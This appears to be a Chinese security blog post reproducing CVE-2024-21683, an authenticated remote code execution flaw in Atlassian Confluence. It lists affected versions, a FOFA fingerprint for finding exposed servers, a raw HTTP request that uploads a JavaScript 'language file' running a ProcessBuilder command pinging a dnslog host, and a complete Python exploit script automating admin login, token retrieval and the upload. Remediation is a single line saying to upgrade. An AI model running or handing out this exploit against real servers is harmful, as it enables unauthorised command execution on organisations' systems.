#  狗屎运~Atlassian Confluence CVE-2024-21683 RCE漏洞复现（附EXP）   
原创 AW  阿无安全   2024-05-24 23:59  
  
<table><tbody><tr><td width="557" valign="top" height="62" style="word-break: break-all;"><section style="margin-bottom: 15px;"><span style="font-size: 14px;"><span style="color: rgb(217, 33, 66);"><strong>声明：</strong></span>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</span><span style="font-size: 14px;letter-spacing: 0.034em;">请勿利用</span><span style="font-size: 14px;letter-spacing: 0.034em;">文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</span></section></td></tr></tbody></table>  
现在只对常读和星标的公众号才展示大图推送，建议大家把  
**阿无安全**  
“  
设为星标  
”，  
否则可能看不到了  
！  
  
  
**0x01 前言**  
  
     
  
  
Confluence是Atlassian公司研发的一个专业的企业知识管理与协同软件。其存在远程命令执行漏洞  
，攻击者可以通过该漏洞获取服务器权限。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagkCHQ8JSCByLEo7XK6GOFT34lkrhZBZ5lxWG50RDUL6qN6DB5xNRkcv7NfQbXrdjw6y8H4RPiaqrA/640?wx_fmt=png&from=appmsg "")  
  
  
  
**0x02 漏洞影响**  
  
  
    影响版本  
```
Confluence Data Center = 8.9.0
8.8.0 <= Confluence Data Center <= 8.8.1
8.7.1 <= Confluence Data Center <= 8.7.2
8.6.0 <= Confluence Data Center <= 8.6.2
8.5.0 <= Confluence Data Center and Server <= 8.5.8 (LTS)
8.4.0 <= Confluence Data Center and Server <= 8.4.5
8.3.0 <= Confluence Data Center and Server <= 8.3.4
8.2.0 <= Confluence Data Center and Server <= 8.2.4
8.1.0 <= Confluence Data Center and Server <= 8.1.4
8.0.0 <= Confluence Data Center and Server <= 8.0.4
7.20.0 <= Confluence Data Center and Server <= 7.20.3
7.19.0 <= Confluence Data Center and Server <= 7.19.21 (LTS)
7.18.0 <= Confluence Data Center and Server <= 7.18.3
7.17.0 <= Confluence Data Center and Server <= 7.17.5
```  
  
**0x03 漏洞利用**  
  
  
刚刚好，  
吃屎的运气  
~   
关注了好久的  
终于爆出漏洞了  
~~  
  
FOFA指纹：  
icon_hash="-305179312"  
界面是这个酱紫  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagkCHQ8JSCByLEo7XK6GOFTHjfdODnpq7YL4Libcz4IMSahWAiaOStJQ2b7MfLQ3aXkfljkryfDExsw/640?wx_fmt=png&from=appmsg "")  
  
当然是有前提条件，需要有个账号：其他数据包就不放了，执行github上的脚本命令会直接挂到burp就能看到  
```
POST /admin/plugins/newcode/addlanguage.action HTTP/2
Host: ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 372
Content-Type: multipart/form-data; boundary=f6dae662e22371daece5ff851b1c4a39

--f6dae662e22371daece5ff851b1c4a39
Content-Disposition: form-data; name="newLanguageName"

test
--f6dae662e22371daece5ff851b1c4a39
Content-Disposition: form-data; name="languageFile"; filename="exploit.js"
Content-Type: text/javascript

new java.lang.ProcessBuilder["(java.lang.String[])"](["ping 5hnlyo.dnslog.cn"]).start()
--f6dae662e22371daece5ff851b1c4a39--

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagkCHQ8JSCByLEo7XK6GOFTXTzWtMf6WhVM9y6icWOc6GnhkqnBNEvQeqfN06rLeuiav7Z8ByFEU0nQ/640?wx_fmt=png&from=appmsg "")  
  
EXP如下：（这里利用github写好的脚本）  
```
import argparse
import os

import requests
from bs4 import BeautifulSoup

def GeyAltToken(url, proxy, session):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    alttoken_url = f"{url}/admin/plugins/newcode/configure.action"
    resp = session.get(url=alttoken_url, headers=headers, verify=False, proxies=proxy, timeout=20)
    if "atlassian-token" in resp.text:
        soup = BeautifulSoup(resp.text, 'html.parser')
        meta_tag = soup.find('meta', {'id': 'atlassian-token', 'name': 'atlassian-token'})
        if meta_tag:
            content_value = meta_tag.get('content')
            return content_value

        else:
            print("Meta tag not found")

def LoginAsAdministrator(session, url, proxy, username, password):
    login_url = url + "/dologin.action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"os_username={username}&os_password={password}&login=%E7%99%BB%E5%BD%95&os_destination=%2F"
    session.post(url=login_url, headers=headers, data=data, proxies=proxy, verify=False, timeout=20)

def DoAuthenticate(session, url, proxy, password, alt_token):
    login_url = url + "/doauthenticate.action"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"atl_token={alt_token}&password={password}&authenticate=%E7%A1%AE%E8%AE%A4&destination=/admin/viewgeneralconfig.action"
    session.post(url=login_url, headers=headers, data=data, proxies=proxy, verify=False, timeout=20)
def UploadEvilJsFile(session, url, proxy, jsFilename, jsFileContent, alt_token):
    url = f"{url}/admin/plugins/newcode/addlanguage.action"
    data = {
        "atl_token": alt_token,
        "newLanguageName": "test"
    }
    files = {
        "languageFile": (
        jsFilename, jsFileContent, "text/javascript")
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    session.post(url, headers=headers, data=data, files=files, verify=False, proxies=proxy, timeout=20)

def ParseArgs():
    parser = argparse.ArgumentParser(description="CVE-2024-21683-RCE")
    parser.add_argument("-u", "--url", type=str, help="target url to check, eg: http://192.168.198.1:8090", required=True)
    parser.add_argument("-p", "--proxy", type=str, default="http://127.0.0.1:8083", help="proxy url, eg: http://127.0.0.1:8083", required=False)
    parser.add_argument("-au", "--admin-username", type=str, help="The username of the user who is in the Administrators group", required=True)
    parser.add_argument("-ap", "--admin-password", type=str, help="The password of the user who is in the Administrators group", required=True)
    parser.add_argument("-f", "--file", type=str, help="exploit file", default="exploit.js", required=True)
    parser.add_argument("-n", "--name", type=str, help="newLanguageName", default="test", required=True)
    return parser.parse_args()

if __name__ == '__main__':
    args = ParseArgs()
    if not args.proxy:
        proxy = {}
    else:
        proxy = {
            "http": args.proxy,
            "https": args.proxy
        }
    session = requests.session()
    jsfn = os.path.basename(args.file)
    jsfc = open(args.file, "r", encoding="utf-8").read()
    LoginAsAdministrator(session, args.url.strip("/"), proxy, args.admin_username, args.admin_password)
    alt_token = GeyAltToken(args.url.strip("/"), proxy, session)
    DoAuthenticate(session, args.url.strip("/"), proxy, args.admin_username, alt_token)
    UploadEvilJsFile(session, args.url.strip("/"), proxy, jsfn, jsfc, alt_token)
```  
  
详情可以去github看  
```
https://github.com/W01fh4cker/CVE-2024-21683-RCE
https://realalphaman.substack.com/p/quick-note-about-cve-2024-21683-authenticated
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zHibqAQoXRagkCHQ8JSCByLEo7XK6GOFTbKlZ7L0ZjUibXccbC2bGEzD9EMNZl8HQ3Ye2rCEZuIpjjSseKFhicDibQ/640?wx_fmt=png&from=appmsg "")  
  
**0x04 修复方案**  
  
****```
请升级最新版本。 
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ib745vqibLBGIeAicnHiag9GCzTYjeicic5IWPqfyjLajDuwtJdNCAnCgcolqY8ROaE5CsEXR5zbjCU9aVl3WfkZpnDw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
往期推荐 · 值得阅看  
  
[CVE-2023-2317 RCE漏洞](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483981&idx=1&sn=39fe7a4494fac9b0b5956f70756c13d3&chksm=c0b20740f7c58e563e7e965e3087b806777a1213e6bbcb639f9852c60ea51bf26be97bcfdf6a&scene=21#wechat_redirect)  
  
  
[苕皮期间~致远OA 0day漏洞](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484010&idx=1&sn=960515c7cb4a2d0ec047c91748f40495&chksm=c0b20767f7c58e7102b9c617cf7686ad17ae942d6ac5abc611ef09241c504f27f43213dfd8b0&scene=21#wechat_redirect)  
  
  
[苕皮期间~用友Nday漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483931&idx=1&sn=61b6410e6f9d1a245e85708889bead5b&chksm=c0b20716f7c58e00501258bade789dcf7167673f282865e24f81be41e6a31d3f245a4c6dd1d2&scene=21#wechat_redirect)  
  
  
[CVE-2023-3450 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484037&idx=1&sn=acebf911f8303db77877b48cdc84d9d1&chksm=c0b20788f7c58e9edc4e6bbc70fb2c2a33473f8e8cf64b4d52c0061c771cb485b702b2b55e35&scene=21#wechat_redirect)  
  
  
[CVE-2023-6895 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484324&idx=1&sn=78f5c6de38555869f71ec618fc8fdc4f&chksm=c0b206a9f7c58fbf4ea5f65e0711f9aa7d3714237b55edf6def9d6c5945b69a985ddce816858&scene=21#wechat_redirect)  
  
  
[CVE-2023-26469 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484030&idx=1&sn=f457c979e0f01ad991b9287aaa24d604&chksm=c0b20773f7c58e65ead3e92141ab7f55af292b8c783ff1ae79cdffc9ace0fdafebb0893ed134&scene=21#wechat_redirect)  
  
  
[XVE-2023-23743 RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484142&idx=1&sn=c1d0a8338093b459469dd83476b9daed&chksm=c0b207e3f7c58ef5ea6fdb159b871cf6d837bbe1f762b0221a718c2d1718c3db70d213d7c034&scene=21#wechat_redirect)  
  
  
[CVE-2023-4120 某设备注入漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484052&idx=1&sn=8aec1c2d9eb9554a8cf5f3f5672c254f&chksm=c0b20799f7c58e8f800dbfbbe83728790b87e9042b29409ef9bab58d38176aef90ec6c737727&scene=21#wechat_redirect)  
  
  
[CVE-2023-4450 | JeecgBoot RCE漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483689&idx=1&sn=a2c3e62fc0cd256106d5b60fce9760ea&chksm=c0b20424f7c58d3242a3d8766f9a0fd033de6ecb016431376eee83421e529eb209530f3e84ae&scene=21#wechat_redirect)  
  
  
[CVE-2023-49070 XML-RPC代码执行漏洞（附EXP）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247484315&idx=1&sn=f2dec378f96ae1b314630abad73de2a8&chksm=c0b20696f7c58f80fe76db3e2f4ea2f3c9fd0d1a71a18f0081d59b810b69beb8425a7358bd92&scene=21#wechat_redirect)  
  
  
[NB！分享一款神器 Linux权限维持Tools（附下载）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483986&idx=1&sn=bf1edbbf2c6544ae32c2f477d21b3baa&chksm=c0b2075ff7c58e49256b13f051beee5599a845e5d10aead29b489ae4792cce08d0902414a62e&scene=21#wechat_redirect)  
  
  
[分享一款WEB界面的高仿CobaltStrike C2远控Tools（附下载）](http://mp.weixin.qq.com/s?__biz=MzkwMTUzNDgxOA==&mid=2247483998&idx=1&sn=4315e04ad5199ca667801160d6ed172d&chksm=c0b20753f7c58e456244481c639ed47742ca6def86bf03d6f73127bf022baabeeb7b8d079501&scene=21#wechat_redirect)  
  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/kuIKKC9tNkAfZibz9TQ8KWj4voxxxNSGMAGiauAWicdDiaVl8fUJYtSgichibSzDUJvsic9HUfC38aPH9ia3sopypYW8ew/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
